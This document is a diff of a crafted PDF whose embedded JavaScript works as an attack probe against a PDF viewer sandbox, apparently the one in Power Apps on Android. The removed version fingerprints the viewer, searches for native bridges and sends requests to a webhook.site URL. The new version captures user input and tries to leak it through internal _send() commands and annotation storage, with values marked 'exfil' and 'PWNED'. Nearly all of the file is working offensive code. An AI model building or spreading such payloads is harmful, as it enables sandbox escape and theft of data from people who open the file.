@@ -1,5 +1,5 @@
 %PDF-1.7
-% Android Recon Probe - March 2026
+% Direct send() Exfil Probe - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -21,76 +21,71 @@ endobj
       try {
         var results = [];
 
-        // === 1. ENGINE ===
-        results.push("=== ENGINE ===");
-        try { results.push("viewerVersion: " + app.viewerVersion); } catch(e) { results.push("viewerVersion: " + e); }
-        try { results.push("viewerType: " + app.viewerType); } catch(e) { results.push("viewerType: " + e); }
-        try { results.push("platform: " + app.platform); } catch(e) { results.push("platform: " + e); }
-        try { results.push("language: " + app.language); } catch(e) { results.push("language: " + e); }
+        // Capture test data first
+        var captured = app.response("Enter test value:", "Power Apps");
+        results.push("captured: [" + captured + "]");
 
-        // === 2. NETWORK ===
-        results.push("=== NETWORK ===");
-        try {
-          this.submitForm({
-            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=android",
-            cSubmitAs: "HTML"
-          });
-          results.push("submitForm: no throw");
-        } catch(e) { results.push("submitForm: " + e); }
-        try {
-          app.launchURL("https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=launch", false);
-          results.push("launchURL: no throw");
-        } catch(e) { results.push("launchURL: " + e); }
-        try {
-          app.launchURL("mailto:?body=androidtest", false);
-          results.push("mailto: no throw");
-        } catch(e) { results.push("mailto: " + e); }
-        try {
-          app.launchURL("intent://probe#Intent;scheme=probe;end", false);
-          results.push("intent: no throw");
-        } catch(e) { results.push("intent: " + e); }
+        if (captured !== null) {
 
-        // === 3. METADATA ===
-        results.push("=== METADATA ===");
-        try {
-          this.info.Title = "ANDROID_TEST";
-          results.push("title write: " + this.info.Title);
-        } catch(e) { results.push("title write: " + e); }
+          // The _send() function in the sandbox calls:
+          // externals["send"](data) -> window.dispatchEvent(CustomEvent("updatefromsandbox"))
+          // The updateFromSandbox handler in viewer.js reads:
+          // { id, siblings, command, value }
+          // If id is present it routes to annotationStorage.setValue(id, detail)
+          // If no id it handles commands: clear/error/layout/page-num/print/zoom/SaveAs etc.
 
-        // === 4. RESPONSE TEST ===
-        results.push("=== RESPONSE ===");
-        try { results.push("app.response type: " + typeof app.response); } catch(e) { results.push("response: " + e); }
+          // === TEST 1: Command without ID - trigger viewer commands ===
+          results.push("=== COMMANDS ===");
 
-        // === 5. WINDOW / WEBKIT ===
-        results.push("=== WINDOW ===");
-        try { results.push("window: " + typeof window); } catch(e) { results.push("window: " + e); }
-        try { results.push("document: " + typeof document); } catch(e) { results.push("document: " + e); }
-        try { results.push("XMLHttpRequest: " + typeof XMLHttpRequest); } catch(e) { results.push("XHR: " + e); }
+          // Try SaveAs command - triggers download
+          try {
+            this._send({ command: "SaveAs" });
+            results.push("SaveAs: sent");
+          } catch(e) { results.push("SaveAs: " + e); }
 
-        // === 6. ANDROID BRIDGES ===
-        results.push("=== BRIDGES ===");
-        try {
-          var paNames = [
-            "PowerAppsNativeHost","PAHost","AppMagicNative",
-            "NativeInterface","AndroidBridge","CanvasHost",
-            "PCFHost","FluentHost","MicrosoftHost","MAMHost"
-          ];
-          var found = paNames.filter(function(n) {
-            try { return typeof window[n] !== "undefined"; } catch(e) { return false; }
-          });
-          results.push(found.length ? found.join(", ") : "none found");
-        } catch(e) { results.push("bridges: " + e); }
+          // Try println - outputs to console (visible in devtools)
+          try {
+            this._send({ command: "println", value: "PWNED:" + captured });
+            results.push("println: sent");
+          } catch(e) { results.push("println: " + e); }
 
-        // === 7. BTOA ===
-        results.push("=== BTOA ===");
-        try {
-          results.push("btoa: " + btoa("androidtest"));
-        } catch(e) { results.push("btoa: " + e); }
+          // Try zoom command
+          try {
+            this._send({ command: "zoom", value: 2 });
+            results.push("zoom: sent");
+          } catch(e) { results.push("zoom: " + e); }
 
-        // === 8. FUNCTION SOURCES ===
-        results.push("=== SOURCES ===");
-        try { results.push("submitForm: " + this.submitForm.toString().slice(0,60)); } catch(e) { results.push("submitForm src: " + e); }
-        try { results.push("launchURL: " + app.launchURL.toString().slice(0,60)); } catch(e) { results.push("launchURL src: " + e); }
+          // === TEST 2: With ID - routes to annotationStorage ===
+          results.push("=== ANNOTATION STORAGE ===");
+
+          // annotationStorage.setValue(id, detail) - sets PDF form field values
+          // If PowerApps reads annotationStorage, this is our bridge
+          try {
+            this._send({ id: "captured_data", value: captured });
+            results.push("annotationStorage id: sent");
+          } catch(e) { results.push("annotationStorage: " + e); }
+
+          // Try with siblings
+          try {
+            this._send({ id: "exfil", siblings: ["exfil2"], value: captured });
+            results.push("with siblings: sent");
+          } catch(e) { results.push("siblings: " + e); }
+
+          // === TEST 3: Try doc._send directly ===
+          results.push("=== DOC SEND ===");
+          try {
+            doc._send({ command: "println", value: "doc._send:" + captured });
+            results.push("doc._send: ok");
+          } catch(e) { results.push("doc._send: " + e); }
+
+          // === TEST 4: console.println ===
+          results.push("=== CONSOLE ===");
+          try {
+            console.println("PWNED_CONSOLE: " + captured);
+            results.push("console.println: sent");
+          } catch(e) { results.push("console.println: " + e); }
+
+        }
 
         app.alert(results.join("\\n"));
 
@@ -112,8 +107,8 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Android Recon) Tj ET
-BT /F1 12 Tf 50 220 Td (Check alert + webhook) Tj ET
+BT /F1 14 Tf 50 250 Td (Direct Send Probe) Tj ET
+BT /F1 12 Tf 50 220 Td (Watch devtools console) Tj ET
 endstream
 endobj
 
